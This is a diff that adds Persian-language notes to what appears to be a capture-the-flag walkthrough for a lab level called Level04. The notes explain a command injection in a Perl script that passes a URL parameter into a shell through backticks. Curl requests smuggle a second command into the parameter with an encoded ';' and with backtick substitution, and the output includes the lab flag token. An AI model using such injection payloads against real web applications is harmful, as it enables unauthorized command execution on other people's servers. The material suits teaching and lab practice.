@@ -59,3 +59,52 @@ curl 'localhost:4747/level04.pl?x=`getflag`'
 
 
 
+
+
+
+curl "http://localhost:4747/?x=hello%3Bgetflag"
+
+دلیلش تفاوت بین Shell Command Separator و Argument است. این دقیقاً نکته اصلی آسیب‌پذیری Level04 است.
+
+بیاییم دو درخواست را با هم مقایسه کنیم.
+1. درخواست اول: اجرای واقعی getflag
+curl "http://localhost:4747/?x=hello%3Bgetflag"
+
+
+بعد از URL Decoding، مقدار پارامتر x می‌شود:
+hello;getflag
+
+
+حالا به کد Perl برگردیم:
+print `echo $y 2>&1`;
+
+
+فرض کنیم $y برابر hello;getflag باشد.
+
+Shell در نهایت این دستور را دریافت می‌کند:
+echo hello;getflag 2>&1
+
+
+نکته مهم اینجاست:
+
+در Shell، علامت ; یک Command Separator است.
+
+یعنی به Shell می‌گوید:
+1. دستور اول را اجرا کن.
+2. بعد از اتمام آن، دستور دوم را اجرا کن.
+پس:
+echo hello
+
+
+اجرا می‌شود و بعد:
+getflag
+
+
+هم اجرا می‌شود.
+
+خروجی:
+hello
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+- Command Injection: تزریق دستور از طریق ;.
+- Command Substitution: اجرای دستور با استفاده از Backtick در Shell.
